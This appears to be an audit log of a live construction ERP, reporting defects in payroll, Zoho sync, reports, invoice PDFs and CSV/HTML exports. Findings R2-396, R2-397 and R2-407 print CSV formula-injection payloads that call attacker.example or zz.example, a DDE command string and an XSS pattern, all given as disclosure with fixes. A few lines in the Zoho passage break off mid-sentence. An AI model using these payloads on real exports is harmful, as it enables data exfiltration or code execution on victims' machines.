now carries **₹85K of salary liability for a month in which ₹42,480 is owed.**

And the second run is the one the product shows:

```
GET /hr/payroll/latest/{cid} → run 16e0ab95-… (2026-05)
```

`latest_payroll_run` orders by `created_at DESC`, so the duplicate becomes the visible run and the
first one disappears from the UI **while its line items keep counting** in every consumer that reads
`PayrollLineItem` without a run filter — the party ledger (`reports.py:569-573`) among them. There is
no delete, no void and no un-finalize: the only remedy is SQL.

Note also that this run was accepted for **2026-05, a closed period two months back**, with no
objection — R2-381's back-dating window does not cover payroll either (it is not called from
`run_payroll`). That is a fourth unguarded money-write to add to that finding's table.

## R2-352 — confirmed, and my Batch 10 wording was too broad

Payslip detail from run `b793f6ad-…`:

| employee | `days_present` | `days_in_month` | gross | net |
|---|---|---|---|---|
| ZZ QA Employee One | **0.0** | 26 | 0.0 | 0.0 |
| ZZ QA Employee One | **0.0** | 26 | 0.0 | 0.0 |
| ZZ QA Employee One | **26.0** | 26 | **23,400** | **21,240** |

**The finding holds, but not universally.** The `default_days` fallback (`hr.py:648-657`) is
conditioned on `date_of_joining`:

- employee joined **before** the payroll month → zero attendance yields `days_present = days_in_month`
  → **a full month's pay**, which is the row above at 26.0 / ₹23,400 for a May in which no attendance
  exists;
- employee joined **after** the month ended → `default_days = 0.0` → a ₹0 payslip, which is correct.

**Correction to Batch 10:** R2-352 said *"zero attendance ⇒ a full month's pay"* without qualification.
The accurate statement is **"zero attendance pays a full month for every employee who joined before
the payroll month"** — i.e. for every employee in steady state, which is the case that matters, but
not for a brand-new joiner. The mid-month-joiner branch (`days_remaining`) is written correctly and
should be recorded as such.

The severity is unchanged: on this live company, an employee with **no attendance whatsoever** was
paid **₹23,400 gross / ₹21,240 net** for May 2026.

**Two smaller observations from the same output**, folded in rather than filed separately:

1. **Three of the five payslips belong to employees with the identical name** `ZZ QA Employee One`.
   Nothing distinguishes them on the payslip, which is the R2-314 name-collision family appearing in
   HR — a payslip is a document handed to a person, and three of them are indistinguishable.
2. **A finalized payroll run containing ₹0 payslips is produced without comment.** Two employees were
   included in the run, computed to zero, and stored — so the run's payslip count (5) overstates the
   people actually paid (1), and nothing flags it.

## Artefacts

No delete, void or un-finalize route exists for payroll.

```sql
-- Batch 28: R2-353 live proof — two finalized runs for 2026-05 plus their line items.
DELETE FROM payroll_line_items WHERE payroll_run_id IN
  ('b793f6ad-a3ef-4d08-bc6b-429be411a2fa','16e0ab95-cf7d-4a0a-b719-2a2e0f3c8cd2');
DELETE FROM payroll_runs WHERE id IN
  ('b793f6ad-a3ef-4d08-bc6b-429be411a2fa','16e0ab95-cf7d-4a0a-b719-2a2e0f3c8cd2');
```

Until these are removed, `GET /hr/payroll/latest/{cid}` reports **2026-05** rather than the real
latest run (2026-07, `4c9a380d-…`), because it orders by `created_at`.

# 🔎 ROUND 8 — BATCH 29: R2-386 proved — and the guarded half is guarded properly

Filed static in Batch 21 from an AST sweep. Both halves tested live on the **messy** project.

## The unguarded half — `ncr_number` accepts duplicates

```
POST /quality/ncr {"ncr_number":"ZZ-R8-NCR-DUP","title":"…probe 1","severity":"Critical"} → 201  7a38d6b8-…
POST /quality/ncr {"ncr_number":"ZZ-R8-NCR-DUP","title":"…probe 2","severity":"Critical"} → 201  86813376-…
```

**Two Critical NCRs on the same project carrying the identical number.** No error, no warning. An NCR
number is the reference quoted to a subcontractor, on the closure certificate and in correspondence —
"NCR ZZ-R8-NCR-DUP is closed" is now ambiguous, and the module's otherwise-clean status machine
(`open → under_review → closed`, one of only two clean status columns in the product) can be applied
to one of them while the other stays open under the same name.

## The guarded half — the application check works, and its scope is right

```
POST /billing/bills {"invoice_number":"ZZ-QA-EXP-001", project: a1376092-…} → 400 "Invoice number already exists for this company"
POST /billing/bills {"invoice_number":"ZZ-QA-EXP-001", project: 4ab9616c-…} → 400 "Invoice number already exists for this company"
```

Refused for the bill's own project **and** for a different project in the same company — confirming
the check is scoped to `company_id`, not `project_id`, which is the correct scope for an invoice
number. The six checked document numbers behave as designed under sequential use.

**What live testing cannot show is the race**, and that is the substance of R2-386: the check is a
`SELECT` followed by a later `INSERT` with **no unique index**, and R2-311 established three Render
instances. Two users on two instances submitting the same invoice number both pass the `SELECT` and
both `INSERT` succeed, because there is no constraint to violate and therefore no `IntegrityError` to
catch. Reproducing that needs concurrent load against production, which is not something this audit
will do — the code and the schema are sufficient evidence, and the fix (a composite
`UniqueConstraint(company_id, <number>)` on seven tables) is the same either way.

**Net effect on R2-386's severity:** unchanged. `ncr_number` is provably unguarded; the other six are
guarded against the ordinary case and unguarded against the concurrent one.

The Zoho re-push proof was prepared and **not executed**. `GET /integrations/zoho-books/status/{cid}`
reports `connected: true` against **organization 60078211590** — a live Zoho Books organisation, not

**That is an outward-facing side effect in a third-party system and it needs explicit approval, which

covers the SiteFlow database; it does not extend to their Zoho org.

R2-368 remains **filed static, with strong circumstantial live evidence**: the Sentry board carries

# 🔎 ROUND 8 — BATCH 30: Zoho — R2-368 proved, and the third "unrelated" Sentry issue turns out to be the integration failing for every GST bill

The founder confirmed the Zoho Books organisation (`60078211590`) is disposable, so the re-push test
was run. It produced more than R2-368.

## R2-368 proved — the product cannot tell an already-pushed bill from a new one

```
POST /integrations/zoho-books/companies/{cid}/push-bill/54122fab-…   (ZZ-QA-NOGST-001, ₹1,000)
→ 502  {"code":13011,"message":"A bill with this number has already been created for this vendor."}

POST … same bill again
→ 502  {"code":13011, …}   identical
```

**The very first push of this session already failed as a duplicate** — the bill had been pushed in an
earlier round, Zoho still holds it, and SiteFlow has no record of that. Every future attempt returns
the same 502, for ever, because nothing in the product knows the document already exists there
(no `zoho_bill_id` column, no push log — R2-368 as filed).

This is the exact signature on the Sentry board — `code 13011`, **6 events over 2 weeks, ongoing** —
and it is now reproducible on demand. **Round 5's classification of it as vendor-side noise is
formally wrong**, as Batch 15 argued from the code and this proves from the wire.

---

## FINDING R2-392 — 🔴 CRITICAL: the Zoho Books push fails for every bill that carries GST, so the integration cannot export a normal Indian vendor bill

Three bills were pushed. The results separate cleanly by one variable:

| Bill | GST | Result |
|---|---|---|
| `ZZ-QA-NOGST-001` ₹1,000 | **0** | reached Zoho's business logic → `13011` duplicate |
| `ZZ-QA-EXP-001` ₹5,900 | ₹900 | **`code 8 — "Invalid Element gst_treatment"`** |
| `TALLY-001` ₹11,800 | ₹1,800 | **`code 8 — "Invalid Element gst_treatment"`** |

Both GST-bearing bills fail at payload validation and never reach the duplicate check. The bill
without GST passes it. The cause is at `zoho_books.py:635-637`:

```python
    # place_of_supply is derived by Zoho from the vendor's gst_no.
    if gstin:
        bill_payload["gst_treatment"] = "business_gst"
```

**The codebase already knows this element is rejected.** Two comments say so explicitly:

```python
    # Best-effort: if the Zoho org is not GST-registered it rejects the
    # gst_treatment element (code 8). That must not break the bill push, so a
    # failure here is swallowed and the push continues without GST on the vendor.   # :252-254

    # Only send GST fields when we actually have a GSTIN. Non-GST Zoho orgs
    # reject the gst_treatment element entirely (code 8), so omit it otherwise    # :282-284
```

So the **vendor-contact** path was hardened against `code 8` in two places — one guard, one deliberate
swallow — and the **bill** path, forty lines later, sends the same element unguarded. The defence was
applied to the two calls where the author hit the error and not to the third, which is Batch 19's
*"a control is implemented once, on the screen its author was working on"* pattern appearing inside a
single file.

### Why this is CRITICAL rather than a payload nit

- **Every ordinary Indian vendor bill carries GST.** The only bill that pushed successfully in this
  test is the deliberately GST-free one created by a previous audit round. **For a real construction
  company, this integration exports nothing.**
- It fails at **502 Bad Gateway** — an infrastructure-shaped status for a payload the product built
  wrongly, which is why it has sat on the Sentry board for two weeks labelled as a vendor problem
  (Round 5) and again in Batch 15 of this audit, where I called it *"a payload-shape mismatch,
  unrelated"*. **That was my own misreading, corrected here:** it is not unrelated, it is the
  integration's main path.
- The fix is the one the same file already applies twice: send `gst_treatment` only when the Zoho
  organisation is GST-registered, and swallow `code 8` rather than failing the push. The
  organisation's GST status is available from Zoho's own `organizations` endpoint.

**Sentry correction, second of this audit:** `code 8` moves from *"unrelated payload mismatch"* to
**R2-392, CRITICAL**. Together with `13011` → R2-368 and `3062` → R2-368, **all three Zoho issues on
the board are product defects.** Round 5 classified all three as vendor-side noise; none of them is.

## FINDING R2-393 — 🟠 HIGH: the Lead Status Funnel is computed in the browser against a hardcoded status vocabulary that nothing keeps in sync with the company's own lead statuses

`reports/[slug]/page.tsx:853-858`:

```ts
const contactedLeads = crmLeads.filter(l => ["Contacted","Qualified","Proposal Sent","Negotiation","Won"].includes(l.status)).length;
const siteVisitLeads = crmLeads.filter(l => ["Site Visit","Qualified","Proposal Sent","Negotiation","Won"].includes(l.status)).length;
const quotationLeads = crmLeads.filter(l => ["Proposal Sent","Negotiation","Won"].includes(l.status)).length;
const wonLeads       = crmLeads.filter(l => l.status === "Won").length;
```

Six magic strings, in the browser, matched with `includes` and `===` against `CRMLead.status` — the
column R2-359 established is **free text**, seeded from a **company-editable lookup**
(`crm_lead_statuses`, with its own `GET`/`POST` endpoints and a picker in the CRM drawer:
`crm/page.tsx:493` writes `status: form.status_name || "New Lead"`).

**So the funnel only works for a company that names its pipeline stages exactly `Contacted`,
`Qualified`, `Site Visit`, `Proposal Sent`, `Negotiation`, `Won`.** The product invites the opposite:
it ships a lookup table specifically so each company can define its own stages. Any company that
writes `Site Visit Done`, `Quote Sent`, `Closed Won` or Hindi labels gets a funnel that reports
**0% conversion at every stage**, with no indication that the labels are the reason.

### Proved live, on screen

`/c/d3724ec3-…/reports/lead-status-funnel` renders:

```
1. New Enquiries             2 Leads (100% baseline)   2 / 2
2. Contacted / Qualified     0 Leads (0% conversion)   0 / 2
3. Site Visit Scheduled      0 Leads (0% conversion)   0 / 2
4. Quotation Shared          0 Leads (0% conversion)   0 / 2
5. Client Confirmed / Won    0 Leads (0% conversion)   0 / 2
TOTAL ENQUIRIES 2 · PROPOSAL RATE 0% · WIN RATE 0%
```

and the underlying data is `GET /crm/leads` → both leads at `status: "New Lead"`. The screen states
*"Real-time conversion metrics calculated from active CRM pipeline leads."*

Note the default the product itself writes — `"New Lead"` — **appears in none of the four filter
arrays.** A lead can therefore only ever leave stage 1 if a human types one of the six magic strings,
and the CRM picker offers whatever the company created instead.

**This is R2-359 with its consequence made visible.** The backend finding said "status is free text
and no funnel can be computed from it"; the UI does compute one anyway, and reports a 0% win rate to
a company that may well be winning work.

## FINDING R2-394 — 🟠 HIGH: the Cost Code Expense Analysis calls an endpoint that does not exist, and renders "no expenses recorded" instead of an error

`reports/[slug]/page.tsx:579-586`:

```ts
    if (slug === "cost-code-expense-analysis") {
      fetch(`${getApiHost()}/apis/v3/finance/payments?company_id=${companyId}`, { headers: {...authHeaders()} })
      .then(res => res.ok ? res.json() : [])      // ← any failure becomes an empty list
      .then(data => setFinancePayments(Array.isArray(data) ? data : []))
      .catch(() => setFinancePayments([]));
    }
```

**`/apis/v3/finance/payments` exposes `POST` only.** Verified against both `openapi.json` and the live
API:

```
GET /apis/v3/finance/payments?company_id=d3724ec3-… → 405 Method Not Allowed
GET /apis/v3/finance/payments                        → 405 Method Not Allowed
```

The correct route is `GET /finance/transactions/{company_id}`, which this audit has been reading all
session. So the report can never receive data, and `res.ok ? … : []` converts the 405 into an empty
array — the frontend twin of `reports.py`'s `except Exception: return []` (R2-312/R2-324).

### Proved live, on screen

`/c/d3724ec3-…/reports/cost-code-expense-analysis` renders:

```
COST CODE EXPENSE BREAKDOWN
Detailed analysis of project expenditures calculated from active accounting payments.
TOTAL SPENT  ₹0
No expense transactions recorded yet for this company.
```

**The company has four payments and ₹8,02,754 of expense bills.** The screen asserts there are none,
in a sentence written to sound like a verified fact rather than a failed request.

This is also the third surface to claim a cost-code total (after R2-335, which established that no
`GROUP BY cost_code` exists in the backend at all) — and the only one a user can reach.

## FINDING R2-395 — 🟠 HIGH: "Export as Excel" writes a CSV and names it `.xlsx`

`page.tsx:740-757`, with the author's own comment:

```ts
    // Default to CSV / Excel (CSV formatted stream)
    const csvContent = [headers.join(","), ...dataRows.map(...)].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    …
    const extension = format === "xlsx" ? "xlsx" : "csv";
    link.setAttribute("download", cleanFileName + `_export.${extension}`);
    …
    showToast(`Report exported successfully as ${format.toUpperCase()}!`);
```

The bytes are CSV, the MIME type is `text/csv`, and **only the file extension changes**. Excel opens
such a file with *"The file format and extension of 'x.xlsx' don't match. The file could be
corrupted…"*, and stricter tools (Google Sheets import, Power Query, an accountant's validator)
refuse it. The user is told *"Report exported successfully as XLSX!"*

No spreadsheet library is used anywhere in the frontend — there is no `xlsx`/`exceljs` import — so the
menu offers a format the product cannot produce.

---

## FINDING R2-396 — 🔴 CRITICAL: the CSV export is formula-injectable, and the product already stores a formula payload

The only escaping applied is quote-doubling (`page.tsx:743`):

```ts
      ...dataRows.map(r => r.map(c => `"${c.replace(/"/g, '""')}"`).join(","))
```

**Nothing neutralises a leading `=`, `+`, `-` or `@`.** A cell whose stored value is
`=HYPERLINK("https://attacker.example/?x="&A1,"Click")` or `=cmd|'/c calc'!A0` is written verbatim and
executed by Excel or LibreOffice when the file is opened — the classic CSV/formula-injection path,
and the reason spreadsheet exports are supposed to prefix a `'` or a tab.

**Both halves of this are now proved in this product:**

- **The storage half** is R2-266 — a DPR was accepted carrying a spreadsheet formula, and it is still
  in the database (its cleanup SQL is in the Round 5 handoff).
- **The export half** is this finding — that value flows through `row[col]` into the CSV with only
  quote-escaping.

So a subcontractor or site user who can create any record whose text reaches a report — a DPR note, a
material name, a party name, a lead's contact name, an NCR title — can plant a formula that runs on
**the accountant's machine**, in a file the accountant believes their own ERP generated. Combined with
R2-278 (a to-do holding a `javascript:` URL) and R2-257 (URLs accept any scheme), the product has no
output-encoding discipline on any surface.

**Fix:** prefix any cell beginning `= + - @` (or a tab/CR) with a single quote, in the one function
above. Six characters of regex, and it closes the highest-severity finding this batch.

---

## FINDING R2-397 — 🟠 HIGH: "Export as PDF" is a print popup, and the HTML/PDF exports interpolate cell values unescaped

Two defects in the same block.

**(a) There is no PDF.** `page.tsx:715-728` opens a blank window, writes an HTML document into it and
calls `window.print()`:

```ts
      const printWindow = window.open("", "_blank");
      if (printWindow) {
        printWindow.document.write(`…<script>window.onload = function(){ window.print(); window.close(); }</script>…`);
        printWindow.document.close();
      }
      showToast("Exported PDF print preview generated!");
```

Whether a file is produced at all depends on the user choosing "Save as PDF" in their print dialog,
and **the popup is silently a no-op when the browser blocks it** — `if (printWindow)` fails and the
toast still claims success. There is no `jspdf`, `pdfmake` or server round-trip: the backend has a
real PDF generator (`app/utils/pdf_generator.py`, used for the client report), and this path does not
use it.

**(b) Cells and headers are injected into HTML unescaped**, in both the HTML file and the print
document:

```ts
      ${headers.map(h => `<th>${h}</th>`).join("")}
      ${dataRows.map(row => `<tr>${row.map(cell => `<td>${cell}</td>`).join("")}</tr>`).join("")}
```

A stored value containing `<img src=x onerror=…>` or `<script>` becomes live markup in the exported
document. The HTML export is downloaded as a file the user then opens from disk — **a local-origin
page executing attacker-supplied script** — and the print variant executes it in a popup on the
console's own origin before printing.

This is the same class as R2-257/R2-278, now on the output side: **the product neither validates on
input nor encodes on output.**

---

## FINDING R2-398 — 🟡 MEDIUM: exported columns come from the UI's column list, and dates export as raw ISO strings

```ts
    const dataRows = processedData.map((row, i) => [String(i+1), ...meta.columns.map(col => row[col] || "")]);
```

Two consequences visible in the live export of `project-wise-payment-summary`:

- **`meta.columns` is the frontend's declared column list**, so every column the backend never fills
  (R2-321's five unfillable Item-wise Sales columns, R2-341's blank `Item Status`, R2-377's empty
  `Retention Amount`) exports as an empty string. The spreadsheet reproduces the product's gaps as
  blank columns rather than omitting them, and `row[col] || ""` also turns a legitimate `0` into `""`.
- **Dates export exactly as the API returns them** — the screen shows
  `2026-07-25T22:26:02.835000+00:00` in the "Last Transaction Date" column, microseconds and all, and
  the CSV carries the same string. No spreadsheet will parse that as a date without manual work.

## FINDING R2-399 — 🔴 CRITICAL: the invoice PDF is not a valid Indian tax invoice — it carries no GSTIN, no HSN/SAC, no CGST/SGST split, no place of supply and no signature block

Rule 46 of the CGST Rules requires a tax invoice to carry, at minimum: the supplier's name, address
and **GSTIN**; the recipient's name, address and **GSTIN**; **HSN/SAC** per line; taxable value; the
**rate and amount of tax split into CGST/SGST/IGST**; **place of supply**; and a signature or digital
signature.

The generated document contains **the company name, a party name, an invoice number, a date, a
status, and four totals.** Missing, verified by reading the extracted text of four separate bills:

| Required element | Present? |
|---|---|
| Supplier GSTIN + address | ❌ — only `AK Construction` |
| Recipient GSTIN + address | ❌ — only a name, and often not that (below) |
| HSN / SAC per line | ❌ |
| Tax split CGST / SGST / IGST | ❌ — a single `GST Amount:` line |
| Place of supply | ❌ |
| Amount in words | ❌ |
| Signature / digital signature block | ❌ |
| Reverse-charge declaration | ❌ |

This is the same gap R2-319 found in the GST **returns** (both fabricate a 50/50 CGST/SGST split
because no place-of-supply column exists), now on the **outbound document a customer receives and
files**. A construction company issuing these cannot claim input credit against them, and cannot
lawfully issue them as sales invoices.

**The company already stores a GSTIN** — `CompanyBranch.gstin` exists and R2-290 proved it accepts
`"NOT-A-GSTIN"` — and the PDF does not print it. The data is one join away.

---

## FINDING R2-400 — 🟠 HIGH: the invoice PDF prints `Party: N/A` whenever the counterparty is not a registered platform user — which is the normal case for a vendor

`billing.py:460-462`:

```python
    party      = db.query(CompanyTeam).filter(CompanyTeam.id == bill.party_company_user_id).first()
    party_user = db.query(User).filter(User.id == party.user_id).first() if party else None
    party_name = party_user.name if party_user and party_user.name else "N/A"
```

The party name is resolved **only** through `CompanyTeam → User`. A vendor who has never signed up to
SiteFlow has no `users` row, so `party_user` is `None` and the invoice prints `N/A`.

**Proved across four live bills:**

```
ZZ-QA-NOGST-001 → Party: N/A                    ← has party_company_user_id 2fc81872-…, a real link
ZZ-QA-EXP-001   → Party: upadhyayprateek574
TALLY-001       → Party: upadhyayprateek574
ZTEST-001       → Party: upadhyayprateek574
```

The first bill **does** carry a valid `party_company_user_id` — the record is linked correctly and the
document still cannot name it. The other three resolve to the founder's own login name, because the
only `User` rows in this company are logins. So an invoice is either addressed to `N/A` or to whoever
happens to be a platform user — **never to the vendor's business name**.

`GET /finance/parties/{cid}` returns the real names — `ZZ QA NoGST Vendor`, `ZZ QA Subcon Co`,
`ZZ QA Client Ltd` — from `LibraryParty`, with `user_id: null` on every row. **The correct name exists
in the database and the PDF queries the wrong table.** This is R2-314's label-versus-id pattern
inverted: here the product holds the id, resolves it through the wrong relationship, and prints
nothing.

---

## FINDING R2-401 — 🟠 HIGH: invoices print `(No line items)` because line items live in a nullable JSON blob the create path does not populate

Two of the four bills render:

```
Description                    Qty       Rate            Amount
(No line items)
SUMMARY / TOTALS
Subtotal: 1000.00 …
```

A tax invoice with **no description of what was supplied** is not merely incomplete, it is unusable —
the recipient cannot verify the charge, and Rule 46 requires a description per line.

The cause is structural: line detail is stored in `Bill.items_json` (`models.py:594`, `Text`,
nullable) — a JSON blob, not rows — and `create_bill` stores whatever the caller sends
(`billing.py:632`, `items_json=req.items_json`) with **no requirement that it be present and no
validation that its contents sum to `subtotal`**. `ZZ-QA-NOGST-001` has `items_json: null` and a
`subtotal` of 1,000, and both are accepted.

This is the same missing-relation family as R2-371 (`bills.po_id`) and R2-360 (no quotation→invoice
path): **because there is no `bill_items` table, nothing can reconcile the lines against the total,
against a purchase order, or against a quotation** — and when the blob is empty the document simply
omits the goods.

---

## FINDING R2-402 — 🟡 MEDIUM: the PO PDF prints `Status: received` while showing only the ordered quantity, so the over-receipt of R2-348 is invisible on the document

The PO PDF for `ZZ-R7-PO-1` — the purchase order used to prove R2-348 — renders:

```
AK Construction | Purchase Order | Vendor: N/A | PO Number: ZZ-R7-PO-1 | Status: received
Material            Qty        Unit    Rate      Tax%    Amount
ZZ R7 Steel Rod     100.0000   tonne   1000.00   18.00   118000.00
Gross Amount: 100000.00 | Tax Amount: 18000.00 | Total Amount: 118000.00
```

`Status: received` is true — the GRN for **10,000 tonne** set it (R2-348). The document shows
`Qty 100.0000` and **no received column at all**, so the printed purchase order asserts the order is
complete while displaying a quantity that is 1% of what was actually booked in. A vendor or auditor
reading this document has no way to see the discrepancy.

`Vendor: N/A` is R2-400 on the procurement side — the same `CompanyTeam → User` chain.

# 🔎 ROUND 9 — BATCH 34: the browser pass over Settings — the data the invoice needs is already stored, and the branding a company uploads reaches no document

Driven through the console in the browser (`/c/{cid}/settings`), reading the live DOM rather than the
API. Two findings, both of which **sharpen R2-399 from "the invoice is incomplete" to "the invoice
omits data the product already holds."**

## What Settings actually contains, read from the live inputs

```js
Array.from(document.querySelectorAll('input')).map(i => ({ph: i.placeholder, val: i.value}))
→ [{ph: "text",                     val: "AK Construction"},
   {ph: "Company phone number",     val: "7667359544"},
   {ph: "Enter Legal Entity Name",  val: "SurajConstruction"},
   {ph: "Enter 15-digit GSTIN",     val: "29ABCDE1234F1Z5"},
   {ph: "file", val: ""} × 4]
```

The page also renders a **BRANDING ASSETS** block with four upload controls — **Logo, Signature,
Stamp, Watermark** — and a Company Details section with a primary address field.

---

## FINDING R2-403 — 🟠 HIGH: the company's GSTIN, legal name and address are stored and printed on no document

**R2-399 said the GSTIN was "one join away". It is not even that** — it is on the `Company` row the
PDF generator already loads to get the company name (`resolve_pdf_branding`, called at
`billing.py:458`). The invoice header prints `AK Construction` and stops.

| Stored in Settings | On the invoice PDF? |
|---|---|
| GSTIN `29ABCDE1234F1Z5` | ❌ |
| Legal entity name `SurajConstruction` | ❌ — prints the trading name instead |
| Phone `7667359544` | ❌ |
| Company primary address | ❌ |

Two aggravating details:

1. **The legal name is the one that belongs on a tax invoice.** Printing `AK Construction` when the
   registered entity is `SurajConstruction` makes the document wrong even in the field it *does*
   fill.
2. **The GSTIN field validates nothing** — placeholder *"Enter 15-digit GSTIN"*, and R2-290 already
   proved `"NOT-A-GSTIN"` is accepted on a branch. `29ABCDE1234F1Z5` is itself a well-known dummy
   GSTIN, so no format check is running here either.

The company has therefore supplied everything Rule 46 requires of the supplier side, and the document
generator ignores all of it.

---

## FINDING R2-404 — 🟠 HIGH: uploaded Logo, Signature, Stamp and Watermark are stored and used by nothing

Settings offers four branding uploads, and `POST /settings/company-file/{company_id}/{asset_type}`
accepts them into `CompanyFile` (`models.py:114-123`, *"Company-scoped branding assets
(logo/signature/stamp/watermark)"*) with an `ALLOWED_ASSET_TYPES` guard (`settings.py:724`).

**Nothing consumes them.** Grepping every reference to `CompanyFile` and `asset_type` outside
`models.py` and the settings router returns only:

- `admin_migrations.py` — a one-off backfill moving BLOBs to Supabase storage,
- `google_drive.py` — an export helper that can push a file to Drive if the user asks.

`app/utils/pdf_generator.py` contains **no reference to `logo`, `signature`, `stamp` or
`watermark`.** The bill, PO and client-report PDFs are generated without them, which is why the
extracted invoice text in Batch 33 has no letterhead and **no signature block** — the exact Rule 46
element R2-399 flagged, sitting uploaded and unused.

This is the fifth write-only record of the audit (after `MaterialWastage`, `MusterRoll`,
`FaceRecognitionLog`, `InspectionResponse`) and the most visible to a customer: a company uploads its
letterhead and stamp, the product confirms the upload, and every document it issues remains plain
text.

**One caveat, stated because this batch could not test it:** the `custom_pdf_template_enabled` path
(`reports.py:137-148`) can inject a `PdfTemplate.content` banner into the *client report* PDF. That is
a separate mechanism from these four assets, it applies to one document type, and it was not
exercised. If a company enables it, some branding may appear there — not on invoices or POs.

# 🔎 ROUND 9 — BATCH 35: the Team screen — what R2-389 looks like to a user, and a build-plan note shipped to production

Clicked through in the browser: `/c/{cid}/settings` → **Team** tab. This is the screen R2-389 predicted
would fail, and seeing it rendered adds two findings the API test could not.

**The screen, verbatim:**

```
TEAM MEMBERS & ROLES
Assign a role to each member. The role determines which modules and actions
they can access across the workspace.

No team members found.

Team
This section is implemented in a later build round (per the Setting tab build order).
Round 1 covers Company (Details, Branches, Business Profile).
```

---

## FINDING R2-405 — 🟠 HIGH: the Team screen renders the 500 from R2-389 as "No team members found"

`GET /settings/team/{company_id}` returns **500 on every company** (R2-389 — `list_team_members` reads
`u.phone`, `User` has `mobile`). The console does not surface that. It renders **"No team members
found."** — a confident empty state, in a company that has team members: `GET /crm/team-members/{cid}`
returns them, and `/finance/parties/{cid}` lists seven party rows.

This is the third instance of the frontend swallowing a failure into an empty state, after
R2-394 (`res.ok ? json : []` on a 405) and R2-397, and it is **the direct reason R2-389 went unnoticed
long enough to never reach the Sentry board**: the screen looks like a company that has not invited
anyone yet.

For a permissions screen this is the worst possible framing — an administrator checking *"who has
access to my data?"* is told **nobody does**.

---

## FINDING R2-406 — 🟡 MEDIUM: an internal build-plan note is displayed to customers in the production console

Immediately below, the same screen prints:

> *"This section is implemented in a later build round (per the Setting tab build order). Round 1
> covers Company (Details, Branches, Business Profile)."*

That is a developer's note about the project's own build sequence, rendered in the paying customer's
settings page. `settings/page.tsx:2494-2500` defines a `Placeholder` component containing the text,
and `:2384-2386` renders it for any section not in the built list:

```tsx
{activeSection !== "company" && activeSection !== "roles" && activeSection !== "payroll" &&
 activeSection !== "holiday" && activeSection !== "workflow" && activeSection !== "docfields" &&
 activeSection !== "approval" && activeSection !== "integrations" && activeSection !== "subscription" && (
  <Placeholder section={…} />
)}
```

**`team` is the only section id missing from that exclusion list**, so Team is the one tab in Settings
that shows it — which is precisely the tab whose backend is broken. The nav still presents Team as a
first-class tab alongside the nine working ones.

Two things this tells a customer, neither intended: that the product is mid-build, and that team
management is not finished — while R2-181/R2-292 established the permission model behind it is
actually **complete and correct** (an owner cannot lock themselves out). **The feature works; the
screen says it does not exist and the API 500s.**

Recorded as MEDIUM rather than cosmetic because it appears in the settings area a prospective customer
is most likely to inspect during evaluation, and because it is one line to remove.

# 🔎 ROUND 9 — BATCH 36: the payslip and DPR exports — and formula injection proved end to end, in a server-generated file

Two more document types opened: `GET /hr/payroll/{run_id}/payslips/export` and `GET /dpr/export`.
Both return real `text/csv` from the **backend**, not the browser. Their contents are below verbatim.

## The DPR export, complete

```csv
Date,Project,Author,Executed Qty,Work Done,Labour Count,Materials,Remarks,Status
2026-07-27,ZZ QA R5 Second Project,7f6c0bcf-fb15-4de1-b1ad-9acbfc02c7a1,5.0,,0,,,submitted
2026-07-27,ZZ QA R5 Second Project,7f6c0bcf-fb15-4de1-b1ad-9acbfc02c7a1,7777.0,,0,,,submitted
2026-07-27,Zoho Test Project,ZZ R8 probe,1.0,,1,ZZ R8 Phantom Sand 500.0 cft,,submitted
2026-07-26,ZZ QA R5 Second Project,7f6c0bcf-…,1.0,"=HYPERLINK(""https://zz.example/?d=""&A1,""ZZ CLICK"")",0,,,submitted
```

---

## FINDING R2-407 — 🔴 CRITICAL: the server-side CSV exports are formula-injectable, and the payload already sitting in the database comes straight out

R2-396 established formula injection in the **frontend** report export. This is the same defect in a
**backend-generated** file, and it is not hypothetical: **row 4 above is R2-266's stored payload**,
exported by the product on request.

```
"=HYPERLINK(""https://zz.example/?d=""&A1,""ZZ CLICK"")"
```

Quote-doubling is applied — `""` — and **nothing neutralises the leading `=`**. Opening
`dpr_export.csv` in Excel or LibreOffice evaluates that cell: `HYPERLINK` renders a clickable link
whose target is built from another cell's contents, which is the standard exfiltration primitive
(`&A1` concatenates neighbouring data into the URL). Swap `HYPERLINK` for `WEBSERVICE`, `IMPORTXML` or
a `cmd|` DDE string and it becomes silent data theft or command execution on the opener's machine.

**This closes the loop the audit had been describing in two halves:**

| Half | Finding | Status |
|---|---|---|
| A DPR accepts and stores a formula | R2-266 (Round 5) | filed, payload still in the database |
| The frontend CSV export does not escape it | R2-396 (Batch 32) | filed |
| **The backend CSV export does not escape it either — and emits the stored payload** | **R2-407** | **proved, verbatim, above** |

The victim is not the person who typed it. It is whoever opens the export — an accountant, a client,
a bank — in a file their own ERP produced and therefore trusts. **Both export paths need the same
one-line fix**: prefix any cell starting `= + - @` (or tab/CR) with `'`.

Note also `Executed Qty 7777.0` on row 2 — R2-266's other half, an unbounded progress quantity, riding
in the same file.

---

## FINDING R2-408 — 🟠 HIGH: the DPR export identifies its author as a raw UUID, or as free text, depending on the row

Three of four rows carry `7f6c0bcf-fb15-4de1-b1ad-9acbfc02c7a1` in the **Author** column. One carries
`ZZ R8 probe` — the string I sent as `reported_by` when creating a DPR in Batch 27.

`DailyProgressReport.reported_by` is a free-text column that the API stores verbatim, so whatever the
caller sends becomes the author of record: a UUID when the console sends one, an arbitrary string
otherwise. **The export never resolves either to a person's name.**

For a daily progress report — the primary contemporaneous site record, used in delay claims and
disputes — an author column containing a raw UUID for some rows and unvalidated text for others means
the document cannot establish who reported what. Same family as R2-400 (`Party: N/A` on the invoice)
and the thirteen-site actor-identity pattern of fix #8, now visible in an exported record.

---
